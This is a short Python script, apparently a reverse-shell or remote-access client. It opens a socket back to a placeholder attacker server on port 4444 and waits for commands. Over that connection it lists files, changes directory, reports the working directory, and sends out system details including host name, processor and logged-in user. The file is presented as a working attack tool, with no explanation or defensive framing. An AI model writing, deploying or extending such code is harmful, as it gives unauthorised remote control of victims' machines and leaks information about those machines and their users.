import socket,os,subprocess,sys,platform

  
def connect():
    SERVER = 'your server ip'
    PORT = 4444
    global s
    s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    s.connect((SERVER,PORT))
    print("[status] ok")

def web():
   print('k')
def command():
    while True:
     com = s.recv(1024).decode('utf-8')
     if com == "pwd":
      s.send(f"Current directory: {os.getcwd()}".encode())
     elif com == "ls":
        file = os.listdir()
        msg = " , " .join(file)
        s.send(msg.encode('utf-8'))
     elif com == 'sysinfo':
                sysinfo = str(f'''
     System: {platform.platform()} {platform.win32_edition()}
     Architecture: {platform.architecture()}
     Name of Computer: {platform.node()}
     Processor: {platform.processor()}
     User: {os.getlogin()}
                ''')
                s.send(sysinfo.encode('utf-8'))
     elif com.startswith("cd "):
        parts = com.split(" ", 1)
        if len(parts) > 1:
            target_dir = parts[1].strip()
            try:
                os.chdir(target_dir)
                msg = f"Changed Directory to {os.getcwd()}"
            except FileNotFoundError:
                msg = f"Directory not found: {target_dir}"
            except PermissionError:
                msg = "Permission denied"
            except Exception as e:
                msg = f"Error: {str(e)}"
            s.sendall(msg.encode("utf-8"))
    
def main():
   connect()
   command()
if __name__ == "__main__":
    main()
